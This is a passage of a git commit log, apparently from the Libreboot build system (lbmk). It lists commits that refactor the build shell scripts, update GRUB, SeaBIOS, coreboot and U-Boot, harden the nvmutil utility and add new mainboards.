on dry runs \n* 24b8e633e03 GRUB: Update to revision 73d1c959e (14 March 2025) \n* f6b77822835 Revert \"vendor.sh: optimise find_me()\" \n* fb7aaa78bb0 vendor.sh: optimise find_me() \n* 903f78bf080 get.sh: add missing check in fetch_project() \n* f15bb8153a3 get.sh: stricter URL check in xbmkget() \n* cdc0fb49e1c get.sh: make xbmkget() easier to understand \n* 620c1dd6fae get.sh: Make xbmkget err on exiting the loop check \n* 900da04efa9 tree.sh: fix up copy_elf(), bad for loop \n* 8aaf404ddea lib.sh: Use while, not for, to process arguments \n* d9c64b26754 xbmk: stricter handling of files on while loops \n* b25a4876434 init.sh: looser XBMK_THREADS validation \n* 769a97aed5a init.sh: Hardcode XBMK_CACHE for integrity \n* 265ec0b7673 dependencies/debian: add libx86 \n* 2702a43a86d init.sh: merge xbmk_lock() with xbmk_set_env() \n* fc4006ce877 init.sh: move xbmk_set_version \n* 962902a1c4a init.sh: set pyver from set_env \n* 158c56072c0 init.sh: merge xbmk_mkdirs with set_env \n* 5f022acbf47 init.sh: check version/versiondate once read \n* 485a60e2f6a init.sh: error if version not read \n* 99f09f25ef3 init.sh: only update version files on parent \n* 94437278dc7 init.sh: simplify unknown version creation \n* 6b603b9fbf4 init.sh: only set xbmk version on parent instance \n* ac36ea7f950 init.sh: initialise variables AFTER path \n* 484afcb9196 init.sh: merge create_pathdirs with set_pyver \n* d0bee6b4ebb init.sh: Set python version only on parent \n* 4aa69a7d1f0 init.sh: remove useless command \n* 36ffe6ef501 init.sh: remove useless comment \n* 0343081d905 init.sh: xbmk_create_tmpdir to xbmk_mkdirs \n* c75bc0449d0 init.sh: move gnupath creation to create_tmpdir \n* 253aa81a3f9 init.sh: move PATH init to set_env \n* e05a18d3513 init.sh: check the lock file BEFORE git init \n* cde3b7051e4 init.sh: return from child in set_env instead \n* 7ec9ee42283 inject.sh: shorten the nukemode variable name \n* b48eb161e49 vendor.sh: simplify mksha512sum() \n* ac609d5aae4 vendor.sh: Remove _dest if it's bad \n* a3e1ed9823d release.sh: rename relsrc to rsrc \n* 44df3b2bff8 release.sh: tidy up nuke() \n* 3c58181f69e get.sh: remove useless message \n* 01a0217c1e3 get.sh: simplify bad_checksum() \n* 4ca57943d70 release.sh: simplify nuke() EVEN MORE, yet again \n* 47a3982bbea release.sh: use x_ on find command for nuke() \n* 6dc71cc0246 release.sh: simplify nuke() EVEN MORE \n* 05c07f7401b get.sh: move nuke() to release.sh \n* 587d245cafa release.sh: simplify prep_release_bin() \n* 136bd66c280 mrc.sh: merge extract_mrc with extract_shellball \n* dbe109d7b54 release.sh: don't move src/docs/ \n* 840d6a1d277 get.sh: FURTHER simplify nuke() \n* d2564fd9457 get.sh: simplify tmpclone() \n* 6dea381614d get.sh: fix bad mkdir command \n* 6a2ed9428b7 vendor.sh: Fix broken KBC1126 insertion \n* 4313b474a59 vendor.sh: additional safety check \n* d668f3a3529 vendor.sh: Properly verify SHA512SUM on extraction \n* a191d22bd6d get.sh: add missing eval to dx_ in nuke() \n* c8813c9a144 properly exit 1 when calling fx_ \n* 208dfc89bd5 get.sh: simplify nuke() \n* 46f42291d3c get.sh: fix broken printf statement \n* f29aa9c8d59 get.sh: use subshells on try_ functions \n* e62886dedae get.sh: simplify try_copy() \n* d9ed03f9ea5 get.sh submodules: Don't delete files recursively \n* 8d5475ed5b5 get.sh: simplify fetch_submodules() config check \n* 21867b7d805 get.sh: simplify fetch_submodules() \n* e9fe5a74a2e get.sh: fix caching of crossgcc tarballs \n* 6089716f07c release.sh: Don't run prep_release with fx_ \n* b04c86e5740 git.sh: rename to get.sh \n* 3c23ff4fa18 git.sh: Only create destination repo on success \n* ed8a33d6fb1 git.sh: cleanup \n* 1ca26c5d238 git.sh: Re-implement redundant git downloads \n* e38805a9448 rom.sh: reduce indendation in check_coreboot_utils \n* 6bf24221e60 release.sh: simplify release() \n* 66f7ecdb2d7 release.sh: clean up the vdir after release \n* d4c0479093a release.sh: remove src_dirname variable \n* 6d3a6347c3e release.sh: build in tmp directory first \n* a0105e1ab44 release.sh: remove unnecessary mkdir command \n* f4871da9bca release.sh: split up build_release() \n* c85aff5c54e release.sh: delete tmp/cache from the tarball \n* 92954eeb38f lib.sh: remove rmgit() \n* 05b5914b354 lib.sh: remove mk() \n* c9696e23338 lib.sh: move xbmkget() to git.sh \n* 23913bb8d2a lib.sh: move mksha512sum() to vendor.sh \n* 80f0562e8d1 lib.sh: split up try_file() \n* 89cd828e87c lib.sh: move _ua to try_file() \n* 308a9ab1e17 mrc.sh: minor cleanup \n* 40163dcfa4e mrc.sh: update copyright year to include 2025 \n* ef800b652c8 inject.sh: remove the hashfiles variable \n* 311ae2f8df2 inject.sh: define xchanged here instead \n* 76f81697e6e vendor.sh: remove check_vcfg() \n* 97d4d020d97 vendor.sh: simplify getvfile() \n* 57f896ac016 vendor.sh: simplify setvfile() \n* 3879f6c4d8f lib.sh: use fx_ in rmgit() \n* 0911a5a5aed lib.sh: split up xbmkget() \n* a449afb287f inject.sh: only compile nvmutil if needed \n* 2bbf2ae80b7 inject.sh: simplified serprog check \n* 9c27b7437cf vendor.sh: tidy up variables \n* 0cc816167bb vendor.sh: split up setvfile() \n* 7d90d434252 remove another confusing message \n* a0c436ad4ba inject.sh: Remove confusing path on tar creation \n* dcfd3e632e2 inject.sh: re-add mac address confirmation \n* e5af201060e inject.sh: further cleanup for vendor.sh \n* 0aa99f4bf8b tree.sh: only create elfdir in copy_elf() \n* a8e374020c0 tree.sh: simplified srcdir check on make-clean \n* 0f931b508a8 inject.sh: split to vendor.sh the download parts \n* 3554b5aad9c inject.sh: split up the inject functions \n* 81dbde7e09f lbmk: use x_ instead of err, where appropriate \n* 14d46abceda mrc.sh: operate on refcode in tmp area first \n* 6e521c2e1ea mrc.sh: fix outdated info in the comment \n* 23486abef3a inject.sh: use direct comparison for metmp \n* 91220ce1833 inject.sh: use subshell to speed up find_me() \n* ff33ec3352b mk: use zero exit instead, to run trees \n* c2b627dc6d0 remove useless comment \n* 066402b7e7a mk: remove unnecessary line break \n* 7012c00ed11 mk: re-split tree logic to include/tree.sh \n* 50ce1ac9b22 mk: move release functions to idnclude/release.sh \n* 1ce3e7a3d39 mk: add missing error handli for mk -f \n* 0d876622fcb git.sh: re-write tmpclone without caching \n* 454f11bdd7b git.sh: use setvars for fail variables \n* 6bdb15fd329 git.sh: hard fail if git am fails \n* 93d4eca04ae git.sh: Hard fail if reset fails \n* a3ba8acface init.sh: Only check XBMK_CACHE if it exists \n* 021e7615c84 HP 820 G2: Use fam15h cbfstool tree for refcode \n* fe926052441 also fix the other grub trees \n*   a8594762d27 Merge pull request 'fix trying to boot all logical volumes after unlocking an encrypted volume' (#330) from cqst/lbmk:master into master \n|\\  \n| * e084b06dc76 fix trying to boot all logical volumes after unlocking an encrypted volume \n|/  \n* 2cea8517f3b init.sh: remove useless export \n* 1b0afdcea22 init.sh: also allow XBMK_RELEASE=Y or N \n* 570f1417a80 init.sh: Resolve XBMK_CACHE via readlink \n* e1af1055ed1 init.sh: check XBMK_CACHE is a directory instead \n* e1628ad8f3e init.sh: export LOCALVERSION in set_env \n* 40a944118f2 init.sh: run set_version before set_env \n* cba04aa74b8 init.sh: Use readlink in pybin() \n* a94bd3c0939 inject.sh: simplify extract_kbc1126ec() \n* e3098c61f43 inject.sh: simplified MAC address handling \n* d530e68594d inject.sh: Simplify patch_release_roms() \n* 7f71328f0e2 lib.sh: Remove useless command in err() \n* 394b4ea7a59 inject.sh: rename copytb and preprom functions \n* ec5c954337b lib.sh: Simplified fx_() and removed fe_() \n* 1390f7f8007 mk: Create serprog tarballs here instead \n* 0ef77e65832 build serprog using fe_ *defined inside mkhelper* \n* d2e6f989d7e rom.sh: build serprog images with fe_ \n* 0faef899469 lib.sh: support any command on find_exec() \n* 2b7f6b7d7ce inject.sh: Simplify extract_intel_me_bruteforce() \n* 485d785d331 inject.sh: clean up tmp me file before extract \n* fac99aa2d44 lib.sh: re-add missing break in fe/fx_ \n* 03300766d14 inject.sh: tidy up extract_intel_me_bruteforce \n* 4781dbd2a05 inject.sh: fix oversight in me bruteforce \n* cf78583a6d8 inject.sh: remove unnecessary check \n* 5657cc1afb3 inject.sh: don't use subshell for me bruteforce \n* 5686f35e0f1 inject.sh: insanely optimise the me bruteforce \n* e8be3fd1d41 git.sh: Simplify git am handling \n* 4c1de1ad126 inject.sh: remove unused function \n* 282b939d9da init.sh: New function dx_ to execute path files \n* 73074dedee3 inject.sh: Further simplified FSP extraction \n* 7585336b914 inject.sh: simplify kconfig scanning \n* ef38333f8b0 lib.sh find_ex: Write sort errors to /dev/null \n* c275f35e7e2 lib.sh x_(): Remove warning of empty args \n* 17d826d3a96 lbmk: Replace err with much simpler implementation \n* f98e34a24dd singletree/elfcheck: use fx_, not fe_ \n* 8ca06463ebc rom.sh: Print the rom image path being generated \n* dc9fe517cb0 rom.sh: Safer cprom() \n* 2be8d1c7982 rom.sh: specifically check keymaps in cprom() \n* 89a8cd4936a rom.sh: simplify mkseagrub() \n* c2182d82193 mk: simplify elfcheck() \n* 437ac2454c1 lib.sh: simplify singletree() \n* 62ec3dac075 git.sh: move singletree() to lib.sh \n* 6b247c93e25 mk: Fix bad error handling for gnu_setver \n* ee8bb28ba21 GRUB: Mark E820 reserved on coreboot memory \n* 61ec396ef6d inject.sh: simplify extract_intel_me_bruteforce() \n* e4edc2194d3 inject.sh: Remove unnecessary check \n* f4057d7daab inject.sh extract_intel_me(): reduce indentation \n* b7ca59debe6 inject.sh: Move FSP extraction only to extract_fsp \n* eb882de94cb inject.sh: tidy up intel me handling \n* 153dd76a82e inject.sh: tidy up the deguard command \n* 428c46ca2b1 lib.sh: set -u -e in err() \n* 20c87308587 lib.sh: Provide error message where none is given \n* 35265731c5b init.sh: Silence the output of git config --global \n* 5e3aaa1eb8b init.sh: Run git name/email check before init \n* a3b5626f53d lib.sh: stricter xbmk_err check in err() \n* 51b2a1159d0 lib.sh: simplify err-not-set handling \n* 61e5fd1a0b2 lib.sh: Add warning if x_ is called without args \n* 4020fb43280 lib.sh: simplify err() \n* b51846da6de init.sh: single-quote xbmklock in xbmk_lock() \n* 8b7bd992f66 init.sh: define lock file in a variable instead \n* 9611c19e7ed init.sh: tidy up xbmk_child_exec() \n* 37ca0c90e1c lib.sh err: add missing redirect to stderr \n* 54291ebb720 lbmk: MUCH safer err function \n* 3f7dc2a55f5 lib.sh: rename errx to xmsg \n* 59c94664e3e lib.sh: Make x_ err if first arg is empty \n* 91bb6cbede0 lib.sh: Make err_ always exit no matter what \n* b19c4f8f674 inject.sh: tidy up TBFW handling \n* 439020fbda5 inject.sh: remove useless comment block \n* 6e447876cca init.sh: tidy up the python version check \n* 7392f6fc8ec init.sh: move non-init functions to lib.sh \n* 7acec7a3a1d init.sh: simplify dependencies handling \n* 93ba36ae456 rom.sh: tidy up copyps1bios() \n* fc71e52fdfc mk: tidy up xgccargs handling \n* 184871bc17c mk: remove useless code \n* b6a2dc4ea3c init.sh: tidy up pathdir creation \n* f5b2bdb8868 mk: re-make gnupath/ after handling crossgcc \n* 1b7a9fd637d mk: tidy up check_cross_compiler \n* 488d52e784f mk: re-make gnupath/ for each cross compiler \n* c33467df1e6 mk: reduce indentation in check_cross_compiler() \n* aa4083443b1 mk: Allow use of x_ on prefix functions \n* 8f828e6cd35 mk: tidy up check_project_hashes() sha512sum check \n* 7a2f33264d7 mk: simplify check_gnu_path() \n* 46b968a6e85 inject.sh: minor code cleanup \n* 5499ae66bd8 inject.sh: simplify extract_archive() \n* 72f4412a52d inject.sh: simplified fsp extraction \n* bf569d2b4dc inject.sh: Remove redundant code in copy_tbfw \n* 8de0ed811fb inject.sh: Stricter TBFW handling \n* 530e4109a2b init.sh: *Re-create* tmpdirs on parent instance \n* 498f5a26cc8 init.sh: Always create xbmklocal \n* 00d22f20829 lbmk: Unified local ./tmp handling \n* 0f7b3691aba lib.sh: redirect find errors to /dev/null \n* 7fadb17fd9e lib.sh: Fix bad touch command \n* 0b09d970732 inject.sh: Only build nvmutil once \n* 308df9ca406 inject.sh: always re-build nvmutil \n* 44a1cc9ef85 util/nvmutil:  use x, not ?, for random characters \n* a17875c3459 lib.sh find_ex: explicitly create the tmp file \n* 0ffaf5c7331 init.sh: Explicitly create the xbmktmp directory \n* fcc52b986e7 init.sh: unified handling of ./tmp \n* 47762c84ad0 lib.sh: add fe_ which is fx_ but err on find \n* d18d1c2cae2 lbmk: unified execution on find commands \n* 773d2deaca0 NEW MAINBOARD: Dell Precision T1700 SFF and MT \n* 9b11e93686c mk: include rom.sh directly \n* 1f7e4b35cb2 mk: Download vendorfiles before building release \n* acb0ea202f2 lib.sh: Simplify rmgit() \n* 15b76bc202f lib.sh: support multiple arguments in remkdir() \n* f3ae3dbbbe4 lib.sh: simplify remkdir() \n* 6c4d88f2686 move x_() to lib.sh \n* 2ae565ba93a init.sh: move setvars/err_ to lib.sh \n* c073ee9d4fc Restore SeaBIOS 9029a010 update, but with AHCI fix \n* 8245f0b3211 Revert \"seabios: bump to rev 9029a010, 4 March 2025\" \n* 4c50157234d coreboot/t420_8mb: add missing txtmode config \n* f21749da8b1 Libreboot 25.04 Corny Calamity \n* bb5f5cd5763 add pico-sdk backport patch fixing gcc 14.x \n* 4f77125066d coreboot/fam15h: update submodule for nasm \n* 0f2202554ab coreboot/fam15h: update nasm to 2.16.03 \n* 2009c26f0aa serprog: Remove pico2 support for the time being \n* a08b8d94fc5 seabios: bump to rev 9029a010, 4 March 2025 \n* 342eca6f3d1 update untitled \n* b0a6d4711a3 coreboot413: add alper's fix to cbfstool for gcc15 \n* 628ae867c9a flashprog: bump to rev e060018 (1 March 2025) \n* 5e96db5a2b4 further gcc-15 fix for gmp on -std=23 \n* 9a9cd26b2d5 coreboot/default and fam15h: gmp fix, gcc15 hostcc \n* 80007223c85 lib.sh: Provide printf for mktarball \n*   a16c483e5fd Merge pull request 'coreboot: fam15h: Add patches to fix build with GCC 15 as host compiler' (#318) from alpernebbi/lbmk:coreboot-fam15h-gcc15 into master \n|\\  \n| * 685685ab0e4 coreboot: fam15h: Add patches to fix build with GCC 15 as host compiler \n|/  \n*   02110f2bc1d Merge pull request 'coreboot: Add patch to fix build with GCC 15 as host compiler' (#317) from alpernebbi/lbmk:coreboot-gcc15-nonstring into master \n|\\  \n| * 5ad1de3931a coreboot: Add patch to fix build with GCC 15 as host compiler \n|/  \n*   9e7bceb7fa9 Merge pull request 'seabios: Fix malloc_fn function pointer in romfile patch' (#313) from alpernebbi/lbmk:seabios-romfile-malloc-fptr into master \n|\\  \n| * 35c853f8b33 seabios: Fix malloc_fn function pointer in romfile patch \n* |   686e136f150 Merge pull request 'dependencies/debian: Fix libusb package name' (#315) from alpernebbi/lbmk:debian-libusb-dependency into master \n|\\ \\  \n| * | 6f120f01588 dependencies/debian: Fix libusb package name \n| |/  \n* / d8b0e749983 init.sh: fix yet another double quote for dotfiles \n|/  \n*   780844112ae Merge pull request 'Update U-Boot to v2025.10' (#305) from alpernebbi/lbmk:uboot-v2025.04 into master \n|\\  \n| * 1265927ca38 u-boot: gru: Disable INIT_SP_RELATIVE \n| * 5bea1fade9a u-boot: arm64: Expand our modified defconfigs to full configs \n| * fd56d8ada13 u-boot: arm64: Merge our modifications into new defconfigs \n| * ed9ddd7415f u-boot: arm64: Add new upstream defconfigs \n| * b1fa44858cb u-boot: arm64: Rebase to v2025.04 \n| * 976fc6890ae u-boot: arm64: Save our modifications to the upstream defconfigs \n| * 418570a6172 u-boot: arm64: Turn configs into defconfigs \n|/  \n* 093a86d9c09 init.sh: don't use eval to read version files \n* 3045079947b init.sh: use backslash for dotfiles in eval \n* da108d1c045 mk: Don't run mkhelpers if mode is set \n* 71a58a38ab4 mk: condense main() again \n* f3882b9bf21 init.sh: make git name/email error more useful \n* 9cebda333d5 init.sh: move git name/mail check to xbmk_git_init \n* ea081adc4ca init.sh: tidy up the git name/email check \n* 3292bded692 mk: make main() more readable \n* 97a5e3d15ed mk: move git check to init.sh xbmk_set_version \n* 11cd952060d init.sh: tidy up xbmk_init() \n* f6c5c8d396d mk: move git_init to init.sh \n* ec1c92238cc init.sh: minor cleanup \n* e009f09e7fa init.sh: clean up setvars \n* 9ec72153408 init.sh setvars: make err a printf for eval \n* 18ad654a1f7 init.sh: merge xbmk_child_init with xbmk_init \n* 15268202478 init.sh: split xbmk_child_init into functions \n* 0280cd4c0e7 init.sh: move parent fork to new function \n* a0e1d42ff74 init.sh: Provide more complete error info \n* a8f0623efbb update uefitool to rev a072527, 26 Apr 2025 \n* c698972130f rename include/vendor.sh to inject.sh \n* 24e488aae56 lib.sh: move _ua to the xbmkget function \n* 6779d3f9915 move variables out of init.sh to others \n* 848159fa0eb lib.sh: rename vendor_checksum \n* 1de77c6558c lib.sh: move singletree() to git.sh \n* 703fe444312 lib.sh: move cbfs() to rom.sh \n* b57952e90d2 re-split include/init.sh to lib.sh \n* 8ecb62c6628 rename include/lib.sh to init.sh \n* ce4381169fa lib.sh: introduce more top-down function order \n* 15b64cfebe8 mk/git.sh: remove tree_depend variable \n* 9b8179c0e5d git.sh: remove unused xgcc linking feature \n* 4624c6e536c mk: remove unused variables (ser/xp) \n* aba5b3a3532 mk: simplify main() \n* 0ab7c6ff9cf lib.sh: use realpath to get sys python on venv \n* 8edea026c58 lib.sh: Force use of System Python to prevent hang \n* b1b964fa5c3 lib.sh: further condense the python check \n* 9543a325acb lib.sh: further simplify the python check \n* 9baabed7186 lib.sh: condense the python check \n* 0c5c5ffc873 lib.sh: simplify mk() \n* 83022b6ba83 lib.sh: simplify cbfs() \n* 13ad839691d lib.sh: simplify the python check \n* b1ea4165754 mk: remove mkhelp() and use x_() instead \n* 4cf64e59ed0 mk: simplify handling of trees() \n* d0581914c74 coreboot/hp8300cmt: purge xhci_overcurrent_mapping \n* cb52fc4ba82 Fix VBT path on HP Elite desktops \n* 2bee87cfc26 lib.sh: add missing copyright year \n* 4b7ab403c65 ifd/q45t_am: unlock regions by default \n* 564155277ea coreboot/g43t_am3: use ifd-based setup \n* 0ddd1963751 coreboot/q45t_am3: use ifd-based setup \n* 3b2d933842a coreboot/default: add missing submodules \n* a10d81399c7 NEW MAINBOARD: Acer Q45T-AM (G43T-AM3 variant) \n* d114e0a765c mk: don't print confirmation of git pkg.cfg \n* f59c24f12aa coreboot/g43t_am3: fix data.vbt path \n* 21020fa319a add missing config/data/coreboot/0 \n*   2b4629d790b Merge pull request 'lib.sh: Fix python3 detection when 'python' is python2' (#290) from alpernebbi/lbmk:python3-detection-fix into master \n|\\  \n| * a18d287a81e lib.sh: Fix python3 detection when 'python' is python2 \n|/  \n* c7569a67145 coreboot/next: merge with coreboot/default \n* 762c7ff43eb coreboot/default: Update, c247f62749b (8 Feb 2025) \n* 86e7aa80c51 Update the GRUB revisions \n* 8d57bf6009e Revert \"git.sh: minor cleanup\" \n* a2898771f6e lib.sh: perform root check even earlier \n* 779f6003421 lib.sh: tidy up opening logic (put it together) \n* bac4be99c20 lib.sh: do root check before python check \n* e63d8dd20d9 git.sh: minor cleanup \n* 11078508a25 lib.sh: simplify mktarball() \n* 087bbedc5f8 vendor.sh: tidy up vendor_download() \n* e11fd52d958 mk: tidy up check_gnu_path() \n* 3442f4278ed mk: simplify check_project_hashes() \n* 6b6a0fa607c lib.sh: fix missing s/TMPDIR/xbmktmp \n* e07a2adb130 lbmk: don't handle TMPDIR directly \n* 9d3b52cd1d2 rom.sh: minor cleanup \n* b4402c54258 vendor.sh: yet even more code cleanup \n* fe5bdc7633d vendor.sh: even more cleanup \n* fcedb17a9a1 vendor.sh: more cleanup \n* 4e2b59ed3ff vendor.sh: minor cleanup \n* a3acf4c3f95 vendor.sh: simplify process_release_roms \n* 30213a96883 vendor.sh: remove unnecessary check \n* 38df7275f12 git.sh: remove unnecessary comment \n* f5891fb6991 git.sh: remove link_crossgcc() \n* a685654b90f git.sh: remove move_repo() \n* e4aa62f79a8 git.sh: remove prep_submodule() \n* 2839feb9e43 git.sh: make git_prep command clearer \n* 410fa702c9c mrc.sh: Make proper use of variable inside printf \n* 075902c3ea7 simplify a few file checks \n* b2255425eba rom.sh: remove unnecessary check \n* 39640d76a75 lbmk: minor cleanup \n* c8dc701f3eb lib.sh mktarball: stricter tar error handling \n* 58a53d7046f vendor.sh: don't err on bruteforce me extract \n* 958fa34832a mk check_project_hashes: handle error on sha512sum \n* 8b4b069e3f6 vendor.sh: remove unnecessary xchanged=\"y\" \n* 166dbb04c92 vendor.sh: set need_files=\"n\" if skipping patch \n* e90657cc734 vendor.sh: Don't handle vendor files if not needed \n* 2e10a45fa36 Revert \"lib.sh: use eval for the command in x_\" \n* 738d4bb6b6d lib.sh: fix bad eval writing resized file \n* eb9e5d2d5d4 lib.sh: fix bad eval writing version/versiondate \n* 3bfdecdc75b lib.sh: use eval for the command in x_ \n* 4fa3bb9e5b1 mk: use eval to run mkhelp commands \n* 9b3635718a8 mk: tidy up the switch/case block in main() \n* 0c381028abc mk: tidier error handling \n* 023f9cf0498 lib.sh: tidy up the error handling \n* cb3253befb9 rom.sh: tidy up error handling \n* 7af46721bcb vendor.sh: tidy up error handling \n* 04ebb3b91a0 vendor.sh: tidy up decat_fspfd() \n* 0c87fdf96ad git.sh: clean up fetch_project() \n* 9eb8856b3c5 mk: Remove unnecessary argument checks on trees() \n* 52f3d54116f vendor.sh: properly call err_ in fail_inject \n* c4c6692b761 remove xbmk_parent, handle forking in lib.sh \n* fd5431db05d lib.sh: define x_ right after err_ \n* 972681a127b mk: minor cleanup \n* b41cd39b686 lib.sh: minor cleanup \n* 49939502648 mrc.sh: minor cleanup \n* c158d82298b rom.sh: minor cleanup \n* cb36248c8c0 vendor.sh: tidy up check_release() \n* 409cab39c56 vendor.sh: tidy up vendor_inject() \n* 12b1623e473 vendor.sh: tidy up readcfg() \n* 0d85f061e2e vendor.sh: tidy up patch_release_roms() \n* 61f20141028 vendor.sh: tidy up process_release_roms() \n* 5901f36e49d vendor.sh: tidy up patch_rom() \n* 082930ce0e7 vendor.sh: tidy up inject() \n* e1f91f30372 vendor.sh: tidy up modify_mac_addresses() \n* 3181ac50126 script/trees: merge with mk and delete script/ \n* 3d03dd1a507 mk: remove the legacy \"roms\" command \n* f0c629dcc6c lib.sh: write version/versiondate to dotfiles \n* 23b942c83e9 lib.sh: hardcode projectname/projectsite \n* a03bb793aea remove update/vendor symlinks \n* d7f80ebe71e move build to mk \n* 57d58527fd0 trees: unify the execution of mkhelper commands \n* e5262da4be7 trees: tidy up configure_project() \n* 51798278397 build: make coreboot building an else in \"roms\" \n* c189257888a trees: don't build dependencies if dry=\":\" \n* 115a66fddd3 trees: unified handling of flags \n* 3ea633cc791 trees: simplified handling of badhash/do_make \n* 9be40e94a2b trees: don't set mode on ./mk -b \n* 67ad7c2635c trees: don't set mod on ./mk -d \n* 24448948419 trees: don't initialise mode to \"all\" \n* 97c50a39a60 trees: clean up some comments \n* cfb14fd8dd8 vendor.sh: simplified readkconfig() \n* 5b697b93a2d lib.sh: double-quote pwd to prevent globbing \n* 5a0a24f5559 lbmk: unified PWD handling (work directory) \n* a25a29cfbb7 lib.sh: initialise PATH if it's unset \n* 1022abf6991 move XBMKPATH to include/lib.sh \n* 0764c969a29 lbmk: use pwd util, not PWD environmental variable \n* f98b9b01107 clean up a few semicolons in the build system \n* 8ccb61cc718 trees: err if first argument is not a flag \n* 947c3e1a176 trees: err if no argument given \n* edbbde0b12d trees: set dry=\":\" on ./mk -f \n* 33bb0ecf764 trees: clean up initialisation of the dry variable \n* c7636ff1dfc trees: initialise mode to \"all\", not \"\" \n* d0bd12631a6 trees: don't abuse the mode variable on -f \n* c4cd876c609 trees: Add missing flag to error output \n* 5ebcae5235f lbmk: minor code formatting cleanup \n* 70cef71dbab grub/xhci: Remove unused patch \n* 3f14a470a2e remove _fsp targets (keep _vfsp) \n* d7312260e7e util/nvmutil: remove excessive comments \n* e348ea0381a Bump GRUB revision to add 73 security patches \n*   4b228c11f9f Merge pull request 'Update pico-serprog revision' (#271) from Riku_V/lbmk:master into master \n|\\  \n| * a8359e30b27 Update pico-serprog revision \n|/  \n* d2cb954933b util/nvmutil: Fix bad error messages on R/W \n* e1e515bd22a util/nvmutil: hardened pledge on help output \n*   ada057a865c Merge pull request 'Simplify the README' (#269) from runxiyu/lbmk:readme-simplification into master \n|\\  \n| * 9ced146b47c README.html: Use newlines instead of bulleted list for docs/support links \n| * 266122592cd README.html: Use the EFF's page on Right to Repair \n| * e36aa8c5a5c README.html: Vastly simplify it \n| * c17f4381ce5 README.html: Mention SeaBIOS and U-Boot instead of Tianocore as payloads \n|/  \n*   47eb049cb47 Merge pull request 'deps/arch: genisoimage belongs to cdrtools' (#267) from runxiyu/lbmk:master into master \n|\\  \n| * fa9a0df2458 deps/arch: genisoimage belongs to cdrtools \n|/  \n* a98490573be util/nvmutil: only set mac_updated at the end \n* 6b9cf09ca21 restore old x230 gbe file \n* 8a435355135 util/nvmutil: Fix bad comparison \n* a65a0c2f963 util/nvmutil: allow ./nvm gbe MAC \n* 96356ce94f6 util/nvmutil: move \"e\" to swap() \n* b1d8975959d util/nvmutil: Only read up to 4KB on larger gbe \n* 6821659bcb2 util/nvmutil: fix minor mistake (line break) \n* 3bb7520f6d9 util/nvmutil: do setmac if only filename given \n* d94b274fd9f vendor.sh: don't error if grep -v fails \n* 6ebdd3c72ba vendor.sh: Don't show gbe filename on inject \n* a08748a9eda util/nvmutil: don't say write not needed if errno \n* 6841a351ebc util/nvmutil: print dump *after* modification \n* da0a6c216cf util/nvmutil: verbosely print the written MAC \n* db5879c6b5a util/nvmutil: minor cleanup in cmd_dump \n* bd7215d1eb7 util/nvmutil: show nvm words written on writeGbe \n* c70117c79c4 util/nvmutil: clean up readonly check on writeGbe \n* cf5a63e65ca util/nvmutil: Remove useless gbeFileChanged var \n* 83601aa524b util/nvmutil: reset errno if any MAC updated \n* 3e86bf5ce25 util/nvmutil: reset errno when writing a MAC \n* bcf53cc2cc0 util/nvmutil: show total number of bytes read \n* c91cc329cf8 util/nvmutil: rename tbw/bw to tnw/nw \n* 90607108330 util/nvmutil: err if bytes read lower than nf \n* c72f699d368 util/nvmutil: err if fewer bytes written \n* d666f67ebe5 util/nvmutil: Show bytes written in writeGbe \n* b2d6393ed5f util/nvmutil swap(): ensure that no overflow occurs \n* 063fef14d34 util/nvmutil: make swap() a bit clearer \n* fd1bbdc96cb util/nvmutil: make 0x3f checksum position a define \n* 5ddf7f251d6 util/nvmutil: make 128 (nvm area) a define \n* 8850acc7da6 util/nvmutil swap(): Only handle the nvm area \n* 49506a88328 util/nvmutil: move write checks to writeGbe \n* 948377b0e7e util/nvmutil: make cmd_swap its own function again \n* 6e134c9f4bf util/nvmutil: minor cleanup \n* 98e105ac4f1 util/nvmutil: allocate less memory for setchecksum \n* 52e8ea57f7b util/nvmutil: Further reduce memory usage \n* 7a7d356824e util/nvmutil: Remove unnecessary buf16 variable \n* cdf23975bc1 util/nvmutil: Only allocate needed memory for file \n* ed45da9cae5 util/nvmutil: Remove unnecessary buffer \n* ec3148dc3b5 util/nvmutil: Show specific error for bad cmd argc \n* 073420d3056 util/nvmutil: cleaner argument handling \n* a6c18734e70 util/nvmutil: extreme pledge/unveil hardening \n* deb307eaf63 util/nvmutil: more minor cleanup \n* c14eccaf153 util/nvmutil: more granular MAC parsing errors \n* 88fb9cc90ea util/nvmutil: more cleanup \n* 5aaf27f80c3 remove errant comment in nvmutil \n* c829b45c17c util/nvmutil: support 16kb and 128kb gbe files \n* a98ca5bf65c util/nvmutil: Prevent unveil allowing dir access \n* 68c32034a00 typo: nvme should say nvm in nvmutil.c \n* c944c2bbac7 util/nvmutil: General code cleanup \n* 8c65e64e398 snip \n* f666652fe15 snip \n* 64d3c7b5150 grub/xhci: Add xHCI non-root-hub fixes from Nitrokey \n* 7bf0d4c2ed5 add gnults-devel to fedora 41 dependencies \n* 66d084e7f7c grub.cfg: scan luks *inside lvm* \n* 5a3b0dab966 grub.cfg: Scan *every* LVM device \n* 3c9f4be76f6 Libreboot 20241206, 8th revision \n* d4cc94d6b44 rom.sh: don't run mkpicotool on dry builds \n* de6d2f556f1 pico-sdk: Import picotool as a dependency \n* 4210ee68ea2 lib.sh: Much safer python version check \n* 8c7ba6131cc coreboot/next uprev: Fix T480 backlight keys \n* 411fb697dfc set up python in PATH, ensuring that it is python3 \n* e8336bcc3ca vendor.sh: Proper semantics on prefix file names \n* 63f45782638 vendor.sh: Confirm if need_files=n \n* 13b06ae130f vendor.sh: Allow restoring the default GbE file \n* ab8feff92e0 vendor.sh: set random MAC address *by default* \n* 0ceaa01d45d vendor.sh: add clarification to nogbe warning \n* 4d5caf1dcfc vendor.sh: check that the vcfg file exists \n* fc4ee88e167 vendor.sh: error out if nuking failed \n* 8819a93d89b add line break, part 3 \n* 8ce1a00f517 add line break, part 2 \n* bc2c14e76a8 add line break \n* c762850311a vendor.sh: prevent double-nuke \n* 68299ad05ca vendor.sh: much more verbose errors/confirmation \n* b8e6d12f3d9 add libx86 to arch dependencies \n* cf8ad497b4e vendor.sh: Remove unnecessary return \n* c858099b359 vendor.sh: Download utils even if vcfg unset \n* ce16856a242 vendor.sh: Allow setmac if vendorfiles not needed \n* 4b51787d078 add less to arch dependencies \n* 8bd028ec153 lib.sh: Set python after dependencies \n* 44b6df7c24c update my copyright years on modified scripts \n* 818f3d630c2 vendor.sh: Don't error if vcfg is unset \n* 432a1a5bca7 lib.sh: Fix unescaped quotes in chkvars() \n* a73b0fd910a Revert \"fix more unescaped quotes in eval\" \n* ec6bcc1fba5 fix more unescaped quotes in eval \n* 5284f20b981 fix ./mk dependencies build issue \n* d825f9a9683 